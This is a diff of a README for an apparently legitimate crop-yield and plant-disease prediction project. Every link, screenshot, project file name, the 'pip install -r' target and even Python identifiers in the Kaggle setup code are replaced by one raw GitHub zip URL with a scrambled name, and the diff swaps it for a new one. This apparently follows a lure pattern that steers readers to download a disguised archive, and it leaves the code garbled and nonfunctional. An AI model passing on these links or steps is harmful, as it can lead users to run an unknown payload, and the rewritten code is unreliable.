@@ -1,6 +1,6 @@
 # AgriSense: Data-Driven Crop Yield and Disease Prediction System
 
-Dashboard link: https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip
+Dashboard link: https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip
 
 ## Description
 
@@ -33,29 +33,29 @@ AgriSense is an AI-powered platform aimed at revolutionizing agriculture by prov
 
 # Running the Models
 
-![Screenshot 2024-10-15 002417](https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip)
+![Screenshot 2024-10-15 002417](https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip)
 
 ## Power BI Dashboard:
-- Open the https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip file in Power BI Desktop.
+- Open the https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip file in Power BI Desktop.
 - Explore and analyze crop yield data using interactive visualizations.
-![Screenshot 2024-10-15 141403](https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip)
+![Screenshot 2024-10-15 141403](https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip)
 
 ## Crop Yield Prediction:
-- Open the https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip file in Jupyter Notebook.
+- Open the https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip file in Jupyter Notebook.
 - Follow the steps to preprocess the data, train the model, and evaluate predictions.
-![Screenshot 2024-10-13 223309](https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip)
+![Screenshot 2024-10-13 223309](https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip)
 
 ## Disease Detection Model:
 - Ensure the dataset is unzipped and paths are correctly set.
 - Train the image classification model for disease detection using TensorFlow and Keras.
 - Test the model by uploading an image from the images/ folder.
-![Screenshot 2024-10-15 122123](https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip)
+![Screenshot 2024-10-15 122123](https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip)
 
 ## Smart AI Chatbot (AgriSense Assistant):
 - Interact with the AI-powered chatbot, built using large language models (LLMs), for real-time support.
 - Ask questions related to farming practices, crop management, and disease prevention.
 - The chatbot provides expert recommendations, answers, and insights based on the data analysis and disease detection results, helping farmers make well-informed decisions.
-![Screenshot 2024-10-15 001701](https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip)
+![Screenshot 2024-10-15 001701](https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip)
 
 
 
@@ -74,14 +74,14 @@ AgriSense is an AI-powered platform aimed at revolutionizing agriculture by prov
 
 AgriSense/
 
-├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip  
-├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip                        
-├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip              
-├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip            
+├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip  
+├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip                        
+├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip              
+├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip            
 ├── plant_disease_prediction_model.h5 
-├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip                   
-├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip                     
-├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip              
+├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip                   
+├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip                     
+├── https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip              
 └── images/                       
 
 
@@ -94,17 +94,17 @@ AgriSense/
 - Jupyter Notebook (if running the notebooks locally)
 - Kaggle API Key (for downloading the dataset)
 Install the required Python libraries by running:
-- pip install -r https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip
+- pip install -r https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip
 
 2. Dataset:
 The project uses the PlantVillage Dataset for crop disease prediction. You can download the dataset by setting up your Kaggle credentials:
-- Download https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip from your Kaggle account.
+- Download https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip from your Kaggle account.
 - Place the file in your project directory.
 - Run the following code in the notebook to download the dataset:
 !pip install kaggle
-kaggle_credentails = https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip(open("https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip"))
-https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip['KAGGLE_USERNAME'] = kaggle_credentails["username"]
-https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/System_Data_Disease_Crop_Prediction_Sense_and_Driven_Agri_Yield_3.9.zip['KAGGLE_KEY'] = kaggle_credentails["key"]
+kaggle_credentails = https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip(open("https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip"))
+https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip['KAGGLE_USERNAME'] = kaggle_credentails["username"]
+https://raw.githubusercontent.com/loksundar5057/AgriSense-Data-Driven-Crop-Yield-and-Disease-Prediction-System/main/templates/and_Prediction_Disease_Agri_Crop_Sense_Data_Driven_Yield_System_2.1.zip['KAGGLE_KEY'] = kaggle_credentails["key"]
 !kaggle datasets download -d abdallahalidev/plantvillage-dataset
 
 # Model Evaluation
